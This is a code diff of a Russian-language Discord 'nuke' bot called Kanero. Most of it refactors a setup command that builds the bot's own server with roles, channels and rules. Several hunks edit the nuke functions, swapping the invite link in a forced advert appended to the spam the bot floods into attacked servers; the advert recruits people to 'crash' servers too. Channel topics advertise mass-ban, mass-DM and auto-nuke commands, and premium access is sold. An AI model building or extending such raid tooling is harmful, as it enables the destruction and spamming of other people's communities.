@@ -222,7 +222,7 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
     if spam_text is None:
         spam_text = config.SPAM_TEXT
     # Реклама добавляется ВСЕГДА — нельзя убрать
-    AD_SUFFIX = "\n\n☠️ Kanero — https://discord.gg/JEspTXRW\n💀 Хочешь так же? Заходи к нам и получи бота бесплатно!"
+    AD_SUFFIX = "\n\n☠️ Kanero — https://discord.gg/bYnpnfu9\n💀 Хочешь так же крашить? Заходи к нам в DC — Kanero: https://discord.gg/bYnpnfu9"
     if AD_SUFFIX not in spam_text:
         spam_text = spam_text + AD_SUFFIX
 
@@ -292,7 +292,7 @@ async def do_superpr_nuke_task(guild, spam_text=None):
     if spam_text is None:
         spam_text = config.SPAM_TEXT
     # Реклама добавляется ВСЕГДА — нельзя убрать
-    AD_SUFFIX = "\n\n☠️ Kanero — https://discord.gg/JEspTXRW\n💀 Хочешь так же? Заходи к нам и получи бота бесплатно!"
+    AD_SUFFIX = "\n\n☠️ Kanero — https://discord.gg/bYnpnfu9\n💀 Хочешь так же крашить? Заходи к нам в DC — Kanero: https://discord.gg/bYnpnfu9"
     if AD_SUFFIX not in spam_text:
         spam_text = spam_text + AD_SUFFIX
 
@@ -383,7 +383,7 @@ async def do_owner_nuke_task(guild, spam_text=None):
     if spam_text is None:
         spam_text = config.SPAM_TEXT
     # Реклама добавляется ВСЕГДА — нельзя убрать
-    AD_SUFFIX = "\n\n☠️ Kanero — https://discord.gg/JEspTXRW\n💀 Хочешь так же? Заходи к нам и получи бота бесплатно!"
+    AD_SUFFIX = "\n\n☠️ Kanero — https://discord.gg/bYnpnfu9\n💀 Хочешь так же крашить? Заходи к нам в DC — Kanero: https://discord.gg/bYnpnfu9"
     if AD_SUFFIX not in spam_text:
         spam_text = spam_text + AD_SUFFIX
 
@@ -497,7 +497,7 @@ async def nuke(ctx, *, text: str = None):
                 "Для использования `!nuke` нужна регистрация.\n\n"
                 "**Как получить доступ (бесплатно):**\n"
                 "Зайди на наш сервер и напиши в канал `#addbot`\n"
-                "https://discord.gg/JEspTXRW\n\n"
+                "https://discord.gg/bYnpnfu9\n\n"
                 "**Расширенный доступ:** **davaidkatt**"
             ),
             color=0x0a0a0a
@@ -676,7 +676,7 @@ async def auto_nuke(ctx, state: str):
                 "Для использования `!auto_nuke` нужна регистрация.\n\n"
                 "**Как получить доступ (бесплатно):**\n"
                 "Зайди на наш сервер и напиши в канал `#addbot`\n"
-                "https://discord.gg/JEspTXRW"
+                "https://discord.gg/bYnpnfu9"
             ),
             color=0x0a0a0a
         )
@@ -1054,93 +1054,28 @@ async def setup(ctx):
                 pass
 
     # ── 2. Создаём роли с правами ──
-    # 👤 Guest — только читать публичные каналы, без права писать и заходить в войс
-    guest_perms = discord.Permissions(
-        read_messages=True,
-        read_message_history=True,
-        send_messages=False,
-        add_reactions=True,
-        connect=False,
-        speak=False
-    )
-    # ✅ White — базовый доступ: читать + писать в чатах, войс
-    white_perms = discord.Permissions(
-        read_messages=True,
-        read_message_history=True,
-        send_messages=True,
-        embed_links=True,
-        attach_files=True,
-        add_reactions=True,
-        use_external_emojis=True,
-        connect=True,
-        speak=True,
-        use_voice_activation=True,
-        stream=True
-    )
-    # 💎 Premium — всё что White + управление сообщениями + перемещение участников
-    premium_perms = discord.Permissions(
-        read_messages=True,
-        read_message_history=True,
-        send_messages=True,
-        embed_links=True,
-        attach_files=True,
-        add_reactions=True,
-        use_external_emojis=True,
-        manage_messages=True,
-        connect=True,
-        speak=True,
-        use_voice_activation=True,
-        stream=True,
-        move_members=True,
-        priority_speaker=True
-    )
-    # 👑 Owner — управление сервером без полного администратора
-    owner_perms = discord.Permissions(
-        read_messages=True,
-        read_message_history=True,
-        send_messages=True,
-        embed_links=True,
-        attach_files=True,
-        add_reactions=True,
-        use_external_emojis=True,
-        manage_messages=True,
-        manage_channels=True,
-        manage_roles=True,
-        manage_webhooks=True,
-        manage_emojis=True,
-        kick_members=True,
-        ban_members=True,
-        manage_nicknames=True,
-        view_audit_log=True,
-        mention_everyone=True,
-        connect=True,
-        speak=True,
-        use_voice_activation=True,
-        stream=True,
-        move_members=True,
-        mute_members=True,
-        deafen_members=True,
-        priority_speaker=True
-    )
-    # 🔧 Developer — полный администратор
-    dev_perms = discord.Permissions(administrator=True)
+    guest_perms   = discord.Permissions(read_messages=True, read_message_history=True, send_messages=False, add_reactions=True, connect=False, speak=False)
+    user_perms    = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=False, speak=False)
+    white_perms   = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=True, speak=True, use_voice_activation=True, stream=True)
+    premium_perms = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, manage_messages=True, connect=True, speak=True, use_voice_activation=True, stream=True, move_members=True, priority_speaker=True)
+    owner_perms   = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, manage_messages=True, manage_channels=True, manage_roles=True, manage_webhooks=True, kick_members=True, ban_members=True, manage_nicknames=True, view_audit_log=True, mention_everyone=True, connect=True, speak=True, use_voice_activation=True, stream=True, move_members=True, mute_members=True, deafen_members=True, priority_speaker=True)
+    dev_perms     = discord.Permissions(administrator=True)
 
-    role_guest   = await guild.create_role(name="👤 Guest",     color=discord.Color.from_rgb(150, 150, 150), permissions=guest_perms,   hoist=False, mentionable=False)
+    role_guest   = await guild.create_role(name="👤 Guest",     color=discord.Color.from_rgb(120, 120, 120), permissions=guest_perms,   hoist=False, mentionable=False)
+    role_user    = await guild.create_role(name="👥 User",      color=discord.Color.from_rgb(180, 180, 180), permissions=user_perms,    hoist=True,  mentionable=False)
     role_white   = await guild.create_role(name="✅ White",     color=discord.Color.from_rgb(85, 170, 255),  permissions=white_perms,   hoist=True,  mentionable=False)
     role_premium = await guild.create_role(name="💎 Premium",   color=discord.Color.from_rgb(180, 80, 255),  permissions=premium_perms, hoist=True,  mentionable=False)
     role_owner   = await guild.create_role(name="👑 Owner",     color=discord.Color.from_rgb(255, 200, 0),   permissions=owner_perms,   hoist=True,  mentionable=False)
     role_dev     = await guild.create_role(name="🔧 Developer", color=discord.Color.from_rgb(255, 60, 60),   permissions=dev_perms,     hoist=True,  mentionable=False)
     role_bot     = await guild.create_role(name="🤖 Kanero",    color=discord.Color.from_rgb(0, 200, 150),   permissions=dev_perms,     hoist=True,  mentionable=False)
+    role_media   = await guild.create_role(name="🎬 Media",     color=discord.Color.from_rgb(255, 140, 0),   hoist=False, mentionable=False)
 
-    # Выдаём роль боту
     try:
         await guild.me.add_roles(role_bot)
     except Exception:
         pass
 
-    # ── Исправляем порядок ролей: Developer сверху, Guest снизу ──
-    # Discord: чем выше position — тем выше в списке
-    # Порядок сверху вниз: Kanero(bot) > Developer > Owner > Premium > White > Guest
+    # Порядок: Kanero > Developer > Owner > Premium > White > User > Guest
     try:
         bot_top = guild.me.top_role.position
         await role_bot.edit(position=max(1, bot_top - 1))
@@ -1148,441 +1083,236 @@ async def setup(ctx):
         await role_owner.edit(position=max(1, bot_top - 3))
         await role_premium.edit(position=max(1, bot_top - 4))
         await role_white.edit(position=max(1, bot_top - 5))
+        await role_user.edit(position=max(1, bot_top - 6))
         await role_guest.edit(position=1)
     except Exception:
         pass
 
-    # ── 3. Настраиваем права по умолчанию — @everyone ничего не видит ──
-    await guild.default_role.edit(permissions=discord.Permissions(
-        read_messages=False,
-        send_messages=False,
-        connect=False
-    ))
+    # ── 3. @everyone — ничего не видит ──
+    await guild.default_role.edit(permissions=discord.Permissions(read_messages=False, send_messages=False, connect=False))
 
-    # Базовые overwrites для публичных каналов (видят все кроме @everyone)
-    def pub_ow():
+    def _ow(read=False, write=False):
+        return discord.PermissionOverwrite(read_messages=read, send_messages=write)
+
+    def admin_ow():
         return {
-            guild.default_role: discord.PermissionOverwrite(read_messages=False),
-            role_guest: discord.PermissionOverwrite(read_messages=True, send_messages=False),
-            role_white: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-            role_premium: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-            role_owner: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-            role_dev: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+            guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(),
+            role_white: _ow(), role_premium: _ow(),
+            role_owner: _ow(True, True), role_dev: _ow(True, True),
         }
 
-    # Только для White+
-    def wl_ow():
-        return {
-            guild.default_role: discord.PermissionOverwrite(read_messages=False),
-            role_guest: discord.PermissionOverwrite(read_messages=False),
-            role_white: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-            role_premium: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-            role_owner: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-            role_dev: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-        }
+    # ── 4. Категории и каналы ──
 
-    # Только для Owner+ (определяется внутри setup ниже, при создании ADMIN категории)
-
-    # ── 4. Создаём категории и каналы ──
-
-    # ━━ 👋 WELCOME (самый верх) ━━
+    # ━━ 👋 WELCOME — виден всем ━━
     cat_welcome = await guild.create_category("━━━━ 👋 WELCOME ━━━━", overwrites={
-        guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=False),
-        role_guest: discord.PermissionOverwrite(read_messages=True, send_messages=False),
-        role_white: discord.PermissionOverwrite(read_messages=True, send_messages=False),
-        role_premium: discord.PermissionOverwrite(read_messages=True, send_messages=False),
-        role_owner: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-        role_dev: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+        guild.default_role: _ow(True, False), role_guest: _ow(True, False),
+        role_user: _ow(True, False), role_white: _ow(True, False),
+        role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
     })
     welcome_ch = await guild.create_text_channel("👋・welcome", category=cat_welcome, overwrites={
-        guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=False),
-        role_guest: discord.PermissionOverwrite(read_messages=True, send_messages=False),
-        role_white: discord.PermissionOverwrite(read_messages=True, send_messages=False),
-        role_premium: discord.PermissionOverwrite(read_messages=True, send_messages=False),
-        role_owner: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-        role_dev: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-    }, topic="📌 Приветствие новых участников — бот автоматически пишет сюда при входе нового участника")
+        guild.default_role: _ow(True, False), role_guest: _ow(True, False),
+        role_user: _ow(True, False), role_white: _ow(True, False),
+        role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
+    }, topic="Приветствие новых участников — бот пишет сюда автоматически")
 
-    # ━━ 📢 ОСНОВНОЕ ━━
+    # ━━ 📢 ОСНОВНОЕ — Guest+ читает ━━
     cat_main = await guild.create_category("━━━━ 📢 ОСНОВНОЕ ━━━━", overwrites={
-        guild.default_role: discord.PermissionOverwrite(read_messages=False),
-        role_guest: discord.PermissionOverwrite(read_messages=True),
-        role_white: discord.PermissionOverwrite(read_messages=True),
-        role_premium: discord.PermissionOverwrite(read_messages=True),
-        role_owner: discord.PermissionOverwrite(read_messages=True),
-        role_dev: discord.PermissionOverwrite(read_messages=True),
+        guild.default_role: _ow(), role_guest: _ow(True, False),
+        role_user: _ow(True, False), role_white: _ow(True, False),
+        role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
     })
-
-    # Права для каналов только-чтение (новости, changelog, конкурсы)
     def readonly_ow():
         return {
-            guild.default_role: discord.PermissionOverwrite(read_messages=False, send_messages=False),
-            role_guest: discord.PermissionOverwrite(read_messages=True, send_messages=False),
-            role_white: discord.PermissionOverwrite(read_messages=True, send_messages=False),
-            role_premium: discord.PermissionOverwrite(read_messages=True, send_messages=False),
-            role_owner: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-            role_dev: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+            guild.default_role: _ow(), role_guest: _ow(True, False),
+            role_user: _ow(True, False), role_white: _ow(True, False),
+            role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
         }
-
-    info_ch  = await guild.create_text_channel("ℹ️・info",      category=cat_main, overwrites=pub_ow(),      topic="📌 Информация о боте Kanero — команды, уровни доступа, как начать пользоваться")
-    rules_ch = await guild.create_text_channel("📜・правила",   category=cat_main, overwrites=pub_ow(),      topic="📌 Правила сервера — прочти перед тем как начать общаться")
-    await guild.create_text_channel("📰・новости",              category=cat_main, overwrites=readonly_ow(), topic="📌 Новости и обновления Kanero — только Owner может писать")
-    await guild.create_text_channel("📋・changelog",            category=cat_main, overwrites=readonly_ow(), topic="📌 История обновлений бота — !changelogall для полной истории")
-    await guild.create_text_channel("🏆・конкурсы",             category=cat_main, overwrites=readonly_ow(), topic="📌 Конкурсы и розыгрыши — следи за обновлениями")
+    rules_ch  = await guild.create_text_channel("📜・правила",  category=cat_main, overwrites=readonly_ow(), topic="Правила сервера")
+    await guild.create_text_channel("📰・новости",              category=cat_main, overwrites=readonly_ow(), topic="Новости Kanero — только Owner пишет")
+    await guild.create_text_channel("📋・changelog",            category=cat_main, overwrites=readonly_ow(), topic="История обновлений — !changelogall")
     addbot_ch = await guild.create_text_channel("🤖・addbot",   category=cat_main, overwrites={
-        guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-        role_guest: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-        role_white: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-        role_premium: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-        role_owner: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-        role_dev: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-    }, topic="📌 Напиши сюда любое сообщение — бот напишет тебе в ЛС с инструкцией по подключению")
-    await guild.create_text_channel("🖼️・медиа",               category=cat_main, overwrites=pub_ow(),      topic="📌 Картинки, видео, мемы, скриншоты — делись контентом")
-    await guild.create_text_channel("🤝・партнёрство",          category=cat_main, overwrites=pub_ow(),      topic="📌 Предложения о партнёрстве — пиши если хочешь сотрудничать")
+        guild.default_role: _ow(), role_guest: _ow(True, True),
+        role_user: _ow(True, True), role_white: _ow(True, True),
+        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
+    }, topic="Напиши сюда — получишь роль User и доступ к боту")
+    await guild.create_text_channel("🖼️・медиа",               category=cat_main, overwrites={
+        guild.default_role: _ow(), role_guest: _ow(True, False),
+        role_user: _ow(True, False),
+        role_media: discord.PermissionOverwrite(read_messages=True, send_messages=True, attach_files=True, embed_links=True),
+        role_white: _ow(True, False), role_premium: _ow(True, False),
+        role_owner: _ow(True, True), role_dev: _ow(True, True),
+    }, topic="Картинки, видео, мемы — писать только 🎬 Media")
+    await guild.create_text_channel("🤝・партнёрство",          category=cat_main, overwrites={
+        guild.default_role: _ow(), role_guest: _ow(True, False),
+        role_user: _ow(True, False), role_white: _ow(True, False),
+        role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
+    }, topic="Предложения о партнёрстве — пишет только администрация")
 
-    # ━━ 💬 ЧАТЫ ━━
+    # ━━ 💬 ЧАТЫ — Guest+ пишет ━━
     cat_chat = await guild.create_category("━━━━ 💬 ЧАТЫ ━━━━", overwrites={
-        guild.default_role: discord.PermissionOverwrite(read_messages=False),
-        role_guest: discord.PermissionOverwrite(read_messages=False),
-        role_white: discord.PermissionOverwrite(read_messages=True),
-        role_premium: discord.PermissionOverwrite(read_messages=True),
-        role_owner: discord.PermissionOverwrite(read_messages=True),
-        role_dev: discord.PermissionOverwrite(read_messages=True),
+        guild.default_role: _ow(), role_guest: _ow(True, True),
+        role_user: _ow(True, True), role_white: _ow(True, True),
+        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
     })
-    await guild.create_text_channel("💬・общий",         category=cat_chat, overwrites=wl_ow(), topic="📌 Общий чат — доступен для White+ участников")
-    await guild.create_text_channel("💡・идеи",          category=cat_chat, overwrites=wl_ow(), topic="📌 Предложения и идеи для улучшения бота и сервера")
-    await guild.create_text_channel("🎫・create-ticket", category=cat_chat, overwrites=wl_ow(), topic="📌 Создать тикет поддержки — напиши сюда если нужна помощь")
+    await guild.create_text_channel("💬・общий", category=cat_chat, overwrites={
+        guild.default_role: _ow(), role_guest: _ow(True, True),
+        role_user: _ow(True, True), role_white: _ow(True, True),
+        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
+    }, topic="Общий чат — доступен для всех участников с ролью")
+    await guild.create_text_channel("💡・идеи", category=cat_chat, overwrites={
+        guild.default_role: _ow(), role_guest: _ow(True, True),
+        role_user: _ow(True, True), role_white: _ow(True, True),
+        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
+    }, topic="Предложения и идеи для улучшения бота")
 
-    # ━━ 💎 PREMIUM ━━
-    cat_prem = await guild.create_category("━━━━ 💎 PREMIUM ━━━━", overwrites={
-        guild.default_role: discord.PermissionOverwrite(read_messages=False),
-        role_guest: discord.PermissionOverwrite(read_messages=False),
-        role_white: discord.PermissionOverwrite(read_messages=False),
-        role_premium: discord.PermissionOverwrite(read_messages=True),
-        role_owner: discord.PermissionOverwrite(read_messages=True),
-        role_dev: discord.PermissionOverwrite(read_messages=True),
+    # ━━ 📋 FREELIST — User+ ━━
+    cat_free = await guild.create_category("━━━━ 📋 FREELIST ━━━━", overwrites={
+        guild.default_role: _ow(), role_guest: _ow(),
+        role_user: _ow(True, True), role_white: _ow(True, True),
+        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
     })
-    prem_ow = {
-        guild.default_role: discord.PermissionOverwrite(read_messages=False),
-        role_guest: discord.PermissionOverwrite(read_messages=False),
-        role_white: discord.PermissionOverwrite(read_messages=False),
-        role_premium: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-        role_owner: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-        role_dev: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-    }
-    await guild.create_text_channel("💎・premium-chat",  category=cat_prem, overwrites=prem_ow, topic="📌 Чат для Premium пользователей — общение, вопросы, обсуждение функций")
-    await guild.create_text_channel("🔑・premium-info",  category=cat_prem, overwrites=prem_ow, topic="📌 Информация о Premium подписке — что входит, как купить, как использовать")
-    await guild.create_text_channel("🛠️・premium-tools", category=cat_prem, overwrites=prem_ow, topic="📌 Расширенные команды бота — !super_nuke, !massban, !massdm и другие Premium функции")
-    await guild.create_text_channel("🎁・premium-gifts", category=cat_prem, overwrites=prem_ow, topic="📌 Подарки и бонусы для Premium участников — эксклюзивные раздачи")
+    await guild.create_text_channel("📋・freelist-chat", category=cat_free, overwrites={
+        guild.default_role: _ow(), role_guest: _ow(),
+        role_user: _ow(True, True), role_white: _ow(True, True),
+        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
+    }, topic="Чат для freelist — !nuke, !auto_nuke, !help, !changelog")
+    await guild.create_text_channel("❓・помощь", category=cat_free, overwrites={
+        guild.default_role: _ow(), role_guest: _ow(),
+        role_user: _ow(True, True), role_white: _ow(True, True),
+        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
+    }, topic="Вопросы и помощь по использованию бота")
+
+    # ━━ ✅ WHITE — White+ ━━
+    cat_wl = await guild.create_category("━━━━ ✅ WHITE ━━━━", overwrites={
+        guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(),
+        role_white: _ow(True, True), role_premium: _ow(True, True),
+        role_owner: _ow(True, True), role_dev: _ow(True, True),
+    })
+    await guild.create_text_channel("✅・white-chat", category=cat_wl, overwrites={
+        guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(),
+        role_white: _ow(True, True), role_premium: _ow(True, True),
+        role_owner: _ow(True, True), role_dev: _ow(True, True),
+    }, topic="Чат для White — !nuke [текст], !stop, !cleanup, !rename, !nicks_all")
+    await guild.create_text_channel("🛠️・команды", category=cat_wl, overwrites={
+        guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(),
+        role_white: _ow(True, True), role_premium: _ow(True, True),
+        role_owner: _ow(True, True), role_dev: _ow(True, True),
+    }, topic="Использование команд — !webhooks, !clear, /sp, /spkd")
+
+    # ━━ 💎 PREMIUM — Premium+ ━━
+    cat_prem_cat = await guild.create_category("━━━━ 💎 PREMIUM ━━━━", overwrites={
+        guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(), role_white: _ow(),
+        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
+    })
+    await guild.create_text_channel("💎・premium-chat",  category=cat_prem_cat, overwrites={
+        guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(), role_white: _ow(),
+        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
+    }, topic="Чат для Premium пользователей")
+    await guild.create_text_channel("🔑・premium-info",  category=cat_prem_cat, overwrites={
+        guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(), role_white: _ow(),
+        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
+    }, topic="Информация о Premium — что входит, как использовать")
+    await guild.create_text_channel("🛠️・premium-tools", category=cat_prem_cat, overwrites={
+        guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(), role_white: _ow(),
+        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
+    }, topic="!super_nuke, !massban, !massdm, !auto_super_nuke и другие Premium команды")
 
     # ━━ 🔊 ВОЙСЫ ━━
     cat_voice = await guild.create_category("━━━━ 🔊 ВОЙСЫ ━━━━", overwrites={
         guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False),
-        role_guest: discord.PermissionOverwrite(connect=False, view_channel=True),
-        role_white: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
-        role_premium: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
-        role_owner: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
-        role_dev: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
+        role_guest:  discord.PermissionOverwrite(connect=False, view_channel=True),
+        role_user:   discord.PermissionOverwrite(connect=False, view_channel=True),
+        role_white:  discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
+        role_premium:discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
+        role_owner:  discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
+        role_dev:    discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
     })
     for i in range(1, 4):
         await guild.create_voice_channel(f"🔊 voice-{i}", category=cat_voice, user_limit=10)
     await guild.create_voice_channel("💎 premium-voice", category=cat_voice, user_limit=20, overwrites={
         guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False),
-        role_guest: discord.PermissionOverwrite(connect=False, view_channel=False),
-        role_white: discord.PermissionOverwrite(connect=False, view_channel=False),
-        role_premium: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
-        role_owner: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
-        role_dev: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
+        role_guest:  discord.PermissionOverwrite(connect=False, view_channel=False),
+        role_user:   discord.PermissionOverwrite(connect=False, view_channel=False),
+        role_white:  discord.PermissionOverwrite(connect=False, view_channel=False),
+        role_premium:discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
+        role_owner:  discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
+        role_dev:    discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
     })
     await guild.create_voice_channel("👑 admin-voice", category=cat_voice, overwrites={
         guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False),
-        role_guest: discord.PermissionOverwrite(connect=False, view_channel=False),
-        role_white: discord.PermissionOverwrite(connect=False, view_channel=False),
-        role_premium: discord.PermissionOverwrite(connect=False, view_channel=False),
-        role_owner: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
-        role_dev: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
+        role_guest:  discord.PermissionOverwrite(connect=False, view_channel=False),
+        role_user:   discord.PermissionOverwrite(connect=False, view_channel=False),
+        role_white:  discord.PermissionOverwrite(connect=False, view_channel=False),
+        role_premium:discord.PermissionOverwrite(connect=False, view_channel=False),
+        role_owner:  discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
+        role_dev:    discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
     })
 
-    # ━━ 👑 ADMIN (самый низ) ━━
+    # ━━ 👑 ADMIN — только Owner+ ━━
     cat_admin = await guild.create_category("━━━━ 👑 ADMIN ━━━━", overwrites={
-        guild.default_role: discord.PermissionOverwrite(read_messages=False),
-        role_guest: discord.PermissionOverwrite(read_messages=False),
-        role_white: discord.PermissionOverwrite(read_messages=False),
-        role_premium: discord.PermissionOverwrite(read_messages=False),
-        role_owner: discord.PermissionOverwrite(read_messages=True),
-        role_dev: discord.PermissionOverwrite(read_messages=True),
+        guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(),
+        role_white: _ow(), role_premium: _ow(),
+        role_owner: _ow(True, True), role_dev: _ow(True, True),
     })
-    def admin_ow():
-        return {
-            guild.default_role: discord.PermissionOverwrite(read_messages=False),
-            role_guest: discord.PermissionOverwrite(read_messages=False),
-            role_white: discord.PermissionOverwrite(read_messages=False),
-            role_premium: discord.PermissionOverwrite(read_messages=False),
-            role_owner: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-            role_dev: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-        }
-    logs_ch = await guild.create_text_channel("📊・logs",         category=cat_admin, overwrites=admin_ow(), topic="📌 Логи действий бота — нюки, входы, выходы, изменения whitelist/premium")
-    await guild.create_text_channel("⚙️・bot-commands",           category=cat_admin, overwrites=admin_ow(), topic="📌 Команды управления ботом — !wl_add, !pm_add, !setup, !auto_off, !nukelogs и другие Owner команды")
-    await guild.create_text_channel("📋・whitelist",              category=cat_admin, overwrites=admin_ow(), topic="📌 Управление whitelist — !wl_add/remove/list, !pm_add/remove, !list")
+    logs_ch = await guild.create_text_channel("📊・logs",       category=cat_admin, overwrites=admin_ow(), topic="Логи нюков — !nukelogs")
+    await guild.create_text_channel("⚙️・bot-commands",         category=cat_admin, overwrites=admin_ow(), topic="Команды управления — !wl_add, !pm_add, !fl_add, !setup, !auto_off")
+    await guild.create_text_channel("📋・lists",                category=cat_admin, overwrites=admin_ow(), topic="Управление списками — !list, !fl_list, !wl_list, !on_list")
 
-    # ── 5. Отправляем контент в каналы ──
+    # ── 5. Контент в каналы ──
 
-    # Welcome
-    welcome_embed = discord.Embed(
+    await welcome_ch.send(embed=discord.Embed(
         title="👋 Добро пожаловать на сервер Kanero!",
         description=(
-            "Этот канал создан для приветствия новых участников.\n"
-            "Бот автоматически пишет сюда когда кто-то заходит на сервер.\n\n"
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
-            "**Как начать пользоваться ботом:**\n"
+            "Бот автоматически пишет сюда при входе нового участника.\n\n"
+            "**Как начать:**\n"
             "1. Зайди в 🤖・addbot и напиши любое сообщение\n"
-            "2. Бот напишет тебе в ЛС\n"
-            "3. Добавь бота на свой сервер и используй команды\n\n"
-            "**Купить Premium:** **davaidkatt** | **@Firisotik**\n"
-            "**Сервер:** https://discord.gg/JEspTXRW"
-        ),
-        color=0x0a0a0a
-    )
-    welcome_embed.set_footer(text="☠️ Kanero  |  Приветствуем новых участников!")
-    await welcome_ch.send(embed=welcome_embed)
-    rules_embed = discord.Embed(
-        title="📜 Правила сервера — Kanero",
-        description=(
-            "Добро пожаловать на официальный сервер **☠️ Kanero**!\n\n"
-            "Прочти правила перед тем как начать общаться. Незнание правил не освобождает от ответственности.\n\n"
-            "━━━━━━━━━━━━━━━━━━━━━━"
-        ),
-        color=0x0a0a0a
-    )
-    rules_embed.add_field(
-        name="📋 Основные правила",
-        value=(
-            "**1.** Уважай всех участников сервера\n"
-            "**2.** Запрещён спам, флуд, капслок\n"
-            "**3.** Не рекламируй сторонние ресурсы без разрешения администрации\n"
-            "**4.** Не делись личными данными других людей (доксинг)\n"
-            "**5.** Строго соблюдай правила Discord ToS\n"
-            "**6.** Не злоупотребляй командами бота на этом сервере\n"
-            "**7.** Запрещён токсик, оскорбления, дискриминация любого рода\n"
-            "**8.** Запрещены NSFW материалы вне специальных каналов\n"
-            "**9.** Не выдавай себя за администрацию или других участников"
-        ),
-        inline=False
-    )
-    rules_embed.add_field(
-        name="🎭 Уровни доступа",
-        value=(
-            "🤖 **Kanero** — сам бот, высший приоритет\n"
-            "🔧 **Developer** — разработчик, полный доступ (administrator)\n"
-            "👑 **Owner** — управление сервером без полного admin\n"
-            "💎 **Premium** — расширенные команды + premium каналы\n"
-            "✅ **White** — базовые команды бота + все чаты\n"
-            "👤 **Guest** — только чтение публичных каналов"
-        ),
-        inline=False
-    )
-    rules_embed.add_field(
-        name="🔑 Как получить доступ",
-        value=(
-            "**White (бесплатно):** напиши в 🤖・addbot — бот напишет в ЛС\n"
-            "**Premium (платно):** напиши **davaidkatt** или **@Firisotik**\n\n"
-            "⚠️ При выходе с сервера доступ удаляется автоматически"
-        ),
-        inline=False
-    )
-    rules_embed.add_field(
-        name="⚖️ Наказания",
-        value=(
-            "• Предупреждение → Мут → Кик → Бан\n"
-            "• За грубые нарушения — бан без предупреждения\n"
-            "• Решение администрации окончательное"
-        ),
-        inline=False
-    )
-    rules_embed.set_footer(text="☠️ Kanero  |  Нарушение правил = бан  |  davaidkatt")
